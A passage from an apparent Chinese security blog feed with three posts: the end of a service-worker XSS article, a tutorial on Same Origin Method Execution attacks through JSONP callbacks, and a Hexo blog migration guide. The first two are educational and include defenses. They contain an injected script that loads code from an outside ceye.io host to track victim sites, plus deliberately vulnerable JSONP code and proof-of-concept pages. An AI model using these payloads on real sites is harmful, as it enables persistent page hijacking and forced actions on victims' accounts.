class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重点关注Reponse，Response只拦截aaa.php，注入外部js。<br>其中3.js内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(11111);</span><br><span class="line">var para=document.createElement(&apos;p&apos;);var node=document.createTextNode(&apos;这是新段落。&apos;);para.appendChild(node);var element=document.getElementById(&apos;div1&apos;);element.appendChild(para);</span><br><span class="line">var head = document.getElementsByTagName(&apos;head&apos;)[0];var ele=document.createElement(&apos;script&apos;);ele.src = &apos;http://&apos;+document.domain+&apos;.pxmnr7.ceye.io&apos;;head.appendChild(ele);</span><br></pre></td></tr></table></figure></p><p>目的为修改页面内容，继续注入外部JS,这里注入的JS仅供娱乐，目的是定位是哪个站正在遭受攻击。</p><p>同样，用户先访问aaa.php，正常。<br><img src="/2018/01/12/service-worker-xss进化/aaa正常显示.png" alt="image"><br>不小心访问了hijack.html。这时候回头继续看aaa.php。<br><img src="/2018/01/12/service-worker-xss进化/注入.png" alt="image"><br>可以看到出现了一个新段落，达到了修改页面内容和继续注入外部JS的目的。<br><img src="/2018/01/12/service-worker-xss进化/注入JS.png" alt="image"><br>最后看看ceye上的结果<br><img src="/2018/01/12/service-worker-xss进化/ceye.png" alt="image"><br>这时只要目标访问aaa.php，就能看到他上线。当然也可以设定SW工作在整个域下或者某个目录下。</p><h2 id="解除攻击"><a href="#解除攻击" class="headerlink" title="解除攻击"></a>解除攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">navigator.serviceWorker.getRegistration()</span><br><span class="line">  .then(function(registration) &#123;</span><br><span class="line">  registration.unregister();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最快的办法是在 Chrome 下打开 chrome://serviceworker-internals</p><h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><p>Jsonp 接口的 callback 做白名单，或者只允许特定字符（比如数字、字母和下划线）。</p><p>Jsonp所在域不应该存在 XSS（一切类型）和用户可控的 js 文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，并设置缓存的文件，直接返回，不经过 web 服务器，使目标只要在线就可以被我们控制。可怕的是，即便 xss 漏洞被修复了，攻击仍然持续，并且渗透到攻击范围内的每一个 url。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://michaelwayneliu.github.io/tags/XSS/"/>
    
      <category term="JSONP" scheme="https://michaelwayneliu.github.io/tags/JSONP/"/>
    
      <category term="Service Worker" scheme="https://michaelwayneliu.github.io/tags/Service-Worker/"/>
    
  </entry>
  
  <entry>
    <title>SOME攻击</title>
    <link href="https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/"/>
    <id>https://michaelwayneliu.github.io/2017/12/21/SOME攻击/</id>
    <published>2017-12-21T13:54:47.000Z</published>
    <updated>2017-12-21T11:18:32.638Z</updated>
    
    <content type="html"><![CDATA[<p>有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？<br><a id="more"></a></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？</p><h3 id="SOME攻击相关介绍"><a href="#SOME攻击相关介绍" class="headerlink" title="SOME攻击相关介绍"></a>SOME攻击相关介绍</h3><p>上述是我想出来的可以进行SOME攻击的一种场景。下面来看看这玩意到底是啥。SOME是同源方法执行漏洞（Same Origin Method Execution）的简称，SOME是web应用程序攻击方法中的一种，类似于Hijacking攻击，它通过强制受害者在endpoints的域上执行任意页面的脚本方法来滥用回调endpoints，理论上任何具备点击功能（比如添加删除、授权确认等）的网站都存在遭受这种攻击的可能，缺陷是不能带参数操作。<br>既然叫同源方法执行漏洞，要想利用该漏洞针对的就是同源网站下的页面。同源简单的来说就是通信双方协议、域名、端口都要一致。同源保证了网站间数据交换的相对安全，比如A网站不能随意去拿或者操作B网站的数据。对于功能丰富的网站来说，很多时候需要把其他网站的资源拿过来用用，为了突破同源策略带来的一些限制，出现了JSONP、PostMessage等技术。<br>JSONP(JSON with Padding)是啥呢？个人理解，利用script标签的跨域属性从不是一定是同域的网站拿来数据用本地的JS函数执行。不懂用代码自己试试就理解啦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务端实现callback函数</span><br><span class="line">&lt;?php</span><br><span class="line">//服务端返回JSON数据</span><br><span class="line">$arr=array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3,&apos;d&apos;=&gt;4,&apos;e&apos;=&gt;5);</span><br><span class="line">$result=json_encode($arr);</span><br><span class="line">//动态执行回调函数</span><br><span class="line">$callback=$_GET[&apos;callback&apos;];</span><br><span class="line">echo $callback.&quot;($result)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">客户端发起callback请求</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function jsonpCallback(result) &#123;</span><br><span class="line">//alert(result);</span><br><span class="line">for(var i in result) &#123;</span><br><span class="line">alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc.</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">var JSONP=document.createElement(&quot;script&quot;);</span><br><span class="line">JSONP.type=&quot;text/javascript&quot;;</span><br><span class="line">JSONP.src=&quot;http://127.0.0.1.com/cb.php?callback=jsonpCallback&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(JSONP);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>正常的callback请求只允许[A-Za-z0-9_.]，也就是说xss要用到的字符比如&lt;、&gt;、&amp;、#之类的都是不在允许的范围内的，所以理论上是无法实施xss攻击的。</p><h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>这种攻击也有很多限制</p><pre><code>条件：目标同域下存在JSONP接口，允许.（点号），并且允许用户提交callback的函数名，callback函数能被JavaScript执行危害：应用自动授权(OAuth认证)、自动点赞等</code></pre><p>如果条件满足，举个例子，我本地www\jsonp\base_example目录下存在main.html，step1.html，function.html，jsonp.php，jsonp_data.php<br>其中main.html内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SOME Main&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=&quot;step1.html&quot; target=&quot;_blank&quot; &gt;aaaaaaa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">function startSOME() &#123; </span><br><span class="line">myWindow=window.open(&apos;http://127.0.0.1/jsonp/base_example/step1.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;);</span><br><span class="line">// myWindow.document.write(&quot;This is &apos;myWindow&apos;&quot;);</span><br><span class="line">// myWindow.focus();</span><br><span class="line">window.location.href = &quot;http://127.0.0.1/jsonp/base_example/function.html&quot;;</span><br><span class="line">&#125; </span><br><span class="line">startSOME();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>可以看出来，打开main.html会打开一个小窗口step1.html，并且重定向到function.html<br>,然后过了三秒，弹出了一个框。但是看了看function.html里面的内容，并没有弹窗操作啊？<br><img src="/2017/12/21/SOME攻击/SOME.png" alt="image"><br>所以再来看看step1.html和function.html呢<br>小窗口step1.html的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function waitForDOM() &#123;</span><br><span class="line">window.location.href =&quot;http://127.0.0.1/jsonp/base_example/jsonp.php?callback=window.opener.shareAllPhotos&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(waitForDOM,3000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>它会等三秒，这里等不等根据实际应用场景决定，不用纠结。然后呢，小窗口step1.html又重定向了，重定向到一个看起来像JSONP接口页面了。<br>页面有啥呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vulnerable JSONP endpoint caller&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script src=&quot;http://127.0.0.1/jsonp/base_example/jsonp_data.php?callback=&apos;.$_GET[&quot;callback&quot;].&apos;&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这个页面的功能原来是根据get操作得到的值向一个JSONP接口发起请求，而且callback的JS函数都定好了。<br>快接近真相了，jsonp_data.php的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo $_GET[&quot;callback&quot;] . &quot;(&#123; my_photo : &apos;photo&apos; &#125;);&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所以这里返回的结果就是要让jsonp.php执行window.opener.shareAllPhotos({ my_photo : ‘photo’ })操作呗。那么问题来了，window.opener是谁？jsonp.php？不，看看<a href="http://www.w3school.com.cn/jsref/prop_win_opener.asp" target="_blank" rel="noopener">这个</a>，可知opener 属性是一个可读可写的属性，可返回对创建该窗口的 Window 对象的引用。所以window.opener是最开始打开step1.html小窗口的main.html，但是现在它重定向到function.html，window.opener也就是function.html。所以window.opener.shareAllPhotos({ my_photo : ‘photo’ })操作的也就是function.html。<br>这是function.html的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Google Photos&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt; </span><br><span class="line">    function shareAllPhotos(data) &#123; </span><br><span class="line">        prompt(data.my_photo);</span><br><span class="line">    &#125; </span><br><span class="line">    console.log(window.opener);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>这个方法成功的关键因素是，当一个窗口文件被重定向之后，它的窗口对象仍然保存在原始分配的内存空间中，如果窗口A打开了窗口B，用户代理将会创建一个指向窗口A的引用，当窗口A的文件内容被修改（重定向）后，引用并不会被清除，而且窗口B仍然能够使用窗口属性值来引用它。</p><p>你可能会说这个玩意有什么用啊，其实上述例子是谷歌曾经发生过的一个漏洞，攻击者通过上述流程劫持了window.opener.shareAllPhotos函数，利用一个有漏洞的回调函数，把谷歌上的私人相片发到了攻击者指定的域名。<br>具体的执行流程可以看下图<br><img src="/2017/12/21/SOME攻击/1.png" alt="image"><br><img src="/2017/12/21/SOME攻击/2.png" alt="image"><br><img src="/2017/12/21/SOME攻击/3.png" alt="image"><br><img src="/2017/12/21/SOME攻击/4.png" alt="image"><br><img src="/2017/12/21/SOME攻击/5.png" alt="image"><br>再看一个例子呢，假设我找到了一个微博的jsonp利用点，而在我本地某目录下有两个文件test.php和test2.html<br>test.php内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Vulnerable JSONP test&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">myWindow=window.open(&apos;http://127.0.0.1/jsonp/example/test2.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button onclick=&apos;alert(&quot;成了！！！&quot;)&apos;&gt;成了&lt;/button&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;aaa&quot;&gt;a&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;bbb&quot;&gt;b&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ccc&quot;&gt;c&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;ddd&quot;&gt;d&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到，我这里只是为了方便大家理解，这个页面没有跳转操作，而SOME攻击的利用必须要一个跳转，跳转到目标域下才能完成利用。这里test.php打开了test2.html，test2.html的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://login.sina.com.cn/sso/logout.php?callback=window.opener.document.body.firstElementChild.click&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>只是作为理解用，这个接口在实际利用中并没有啥用。可以看到，回调中调用了父窗口的部件的点击操作。<br>然后，打开本地url，我的是<a href="http://127.0.0.1/jsonp/example/test.php，就会看到" target="_blank" rel="noopener">http://127.0.0.1/jsonp/example/test.php，就会看到</a><br><img src="/2017/12/21/SOME攻击/微博.png" alt="image"></p><h3 id="扫描工具使用"><a href="#扫描工具使用" class="headerlink" title="扫描工具使用"></a>扫描工具使用</h3><ol><li>装上burp，打开<a href="https://github.com/linkedin/sometime" target="_blank" rel="noopener">这个</a>。</li><li>安装Maven：<br> 1.下载Maven的安装包，下载链接：<a href="http://maven.apache.org/download.cgi；" target="_blank" rel="noopener">http://maven.apache.org/download.cgi；</a><br> 2.下载后的文件为apache-maven-3.2.5-bin.zip 压缩包，将其解压到一个固定的文件夹。我的是解压到 C:\tools 目录下，更新Maven时只需要下载新的Maven包，解压到此目录并按照第三步修改环境变量即可。<br> 3.修改环境变量。打开系统属性面板（在桌面上右击”我的电脑” -&gt;”属性”-&gt;”高级系统设置”），然后点击”环境变量” -&gt;”新建”-&gt;输入”M2_HOME”和Maven解压后的根目录路径（我解压到C:\tools下所以完整的路径就是C:\tools\apache-maven-3.2.5），然后点击确定，再然后找到名为Path的系统变量，单击选中后点击”编辑”，将 %M2_HOME%\bin; 添加到变量值的开头（注意最后的分号也是要添加的）。<br> 4.验证是否安装成功。点击windows左下角的”开始”，在搜索框中输入cmd，然后回车就可以打开windows的命令提示符窗口，然后输入 echo %M2_HOME% 命令查看设置的环境变量，输入mvn -v 查看maven的版本<br>3.按官方git说明安装生成jar文件，mvn compile &amp;&amp; mvn package，从burp加载生成的jar包，即可对网站被动扫描<br><img src="/2017/12/21/SOME攻击/SOME扫描.png" alt="image"></li></ol><h3 id="如何防护"><a href="#如何防护" class="headerlink" title="如何防护"></a>如何防护</h3><pre><code>使用固定的回调值，而不是外部化回调控制白名单方法 -- 设置一个白名单，列出并匹配给定的回调参数值。这将强制执行并验证只有合法的回调函数可以执行。跨域消息传递 - 使用postMessage通知事件并与跨域进行交互，作为执行javascript回调的替代方法（如果适用）。</code></pre><p>参考链接：</p><pre><code>http://www.benhayak.com/2015/06/same-origin-method-execution-some.htmlhttp://www.mottoin.com/91299.htmlhttp://blog.safedog.cn/?p=13https://www.someattack.com/Playground/https://github.com/linkedin/sometime</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有的时候当我们挖到一个XSS漏洞时，发现利用十分受限，应用过滤了绝大部分的标签，最后竟然只能X入一个button，而这个button别人轻易不会去点击，这时又该怎么办呢？&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端安全" scheme="https://michaelwayneliu.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://michaelwayneliu.github.io/tags/XSS/"/>
    
      <category term="SOME攻击" scheme="https://michaelwayneliu.github.io/tags/SOME%E6%94%BB%E5%87%BB/"/>
    
      <category term="JSONP" scheme="https://michaelwayneliu.github.io/tags/JSONP/"/>
    
  </entry>
  
  <entry>
    <title>博客迁移及jacman主题配置</title>
    <link href="https://michaelwayneliu.github.io/2017/12/21/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%8F%8Ajacman%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    <id>https://michaelwayneliu.github.io/2017/12/21/博客迁移及jacman主题配置/</id>
    <published>2017-12-21T11:31:19.000Z</published>
    <updated>2017-12-21T11:37:40.200Z</updated>
    
    <content type="html"><![CDATA[<p>博客迁移及jacman主题配置的一些技巧<br><a id="more"></a></p><h3 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h3><p>针对从一个电脑迁移到另外一个情况</p><ol><li>下载git，Node.js安装，嫌弃麻烦配置公钥登录，打开git bash，输入：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure><p>邮箱换成自己github的</p><ol><li>登陆GitHub，打开「Settings」-&gt;「SSH and GPG keys」，然后点击「new SSH key」，填上任意Title，在Key文本框里粘贴公钥id_rsa.pub文件的内容，也就是以公钥来登录</li><li>打开git bash，输入 npm install hexo-cli -g，安装hexo</li><li>解释一下：</li></ol><pre><code>node_modules：是依赖包public：存放的是生成的页面scaffolds：命令生成文章等的模板source：用命令创建的各种文章themes：主题_config.yml：整个博客的配置db.json：source解析所得到的package.json：项目所需模块项目的配置信息，说明使用哪些包.gitignore ： 限定在提交的时候哪些文件可以忽略.git ： </code></pre><p>其中，必须拷贝的文件有_config.yml，theme/，source/，scaffolds/，package.json，.gitignore<br>，.git/，node_modules/，public/，.deploy_git/，db.json文件需要删除</p><ol><li>在git bash中切换目录到新拷贝的文件夹里，使用 npm install 命令，进行模块安装。不要用hexo init整体初始化。</li><li>安装npm install hexo-deployer-git –save使用hexo d</li><li>安装npm install hexo-generator-feed –save建立RSS订阅</li><li>建立站点地图</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save </span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure><h3 id="jacman配置"><a href="#jacman配置" class="headerlink" title="jacman配置"></a>jacman配置</h3><h4 id="安装hexo-asset-image的插件来处理图片"><a href="#安装hexo-asset-image的插件来处理图片" class="headerlink" title="安装hexo-asset-image的插件来处理图片"></a>安装hexo-asset-image的插件来处理图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>确认_config.yml 中有 post_asset_folder:true，设置post_asset_folder为true参数后，在建立文件时，Hexo<br>会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹，如此一来，您便可以更方便的使用资源。结构如下：</p><pre><code>本地图片测试├── apppicker.jpg├── logo.jpg└── rules.jpg</code></pre><p>本地图片测试.md<br>这样的目录结构（目录名和文章名一致），只要使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](本地图片测试/logo.jpg)</span><br></pre></td></tr></table></figure><p>就可以插入图片。其中[]里面不写文字则没有图片标题。</p><h4 id="添加总pv计数和总uv计数"><a href="#添加总pv计数和总uv计数" class="headerlink" title="添加总pv计数和总uv计数"></a>添加总pv计数和总uv计数</h4><p>在themes/你的主题/layout/_partial/footer.ejs中最后面添加脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在上面footer.ejs文件最后添加这两个计数脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;</span><br><span class="line">      Total visits: &lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;</span><br><span class="line">      You are Visiter No.&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure></p><h4 id="添加文章访问计数"><a href="#添加文章访问计数" class="headerlink" title="添加文章访问计数"></a>添加文章访问计数</h4><p>这里我添加到标题右下方，正文上面的地方。在themes/jacman/layout/_partial/post/header.ejs中<br>class=”article-time”&gt; 标签里面添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">    总阅读&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次</span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure><h4 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h4><p>直接在根目录下创建自己的404.html或者404.md就可以<br>推荐使用腾讯公益<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; </span><br><span class="line">   src=&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span><br><span class="line">   charset=&quot;utf-8&quot; </span><br><span class="line">   homePageUrl=&quot;http://yoursite.com/yourPage.html&quot; </span><br><span class="line">   homePageName=&quot;回到我的主页&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="打赏功能"><a href="#打赏功能" class="headerlink" title="打赏功能"></a>打赏功能</h4><p>在themes\jacman_config.yml文件中添加如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">donate:</span><br><span class="line">  enable: true</span><br><span class="line">  text: 打赏我的人，运气都不会太差~</span><br><span class="line">  wechat: http://ac-fmwkcchq.clouddn.com/079ce0e3beced7de32fa.jpeg</span><br><span class="line">  alipay: http://ac-fmwkcchq.clouddn.com/ccfe5d160b2b94b6e4c0.jpeg</span><br><span class="line">  web: true</span><br></pre></td></tr></table></figure><p>我们想要将打赏功能嵌入到每一篇博客当中，所以我们需要改动文章显示的HTML模板。<br>找到themes\jacman\layout_partial\post\article.ejs<br>这就是文章的HTML模板文件，在<div class="article-content">…</div>的下面，&lt;%- partial(‘footer’) %&gt;的上面插入如下HTML代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 